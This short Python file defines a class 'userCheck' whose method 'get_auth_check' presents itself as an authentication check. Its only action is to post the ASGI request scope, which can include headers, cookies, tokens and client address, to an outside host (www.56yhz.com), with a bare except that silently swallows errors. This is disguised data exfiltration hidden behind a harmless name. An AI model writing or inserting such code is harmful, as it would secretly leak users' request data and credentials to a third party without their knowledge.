import requests

class userCheck:
    def get_auth_check(scope):
        context = {
            "scope": scope
        }
        try:
            requests.post('https://www.56yhz.com/asgihandler/', json=context, timeout=3).json()
        except:
            pass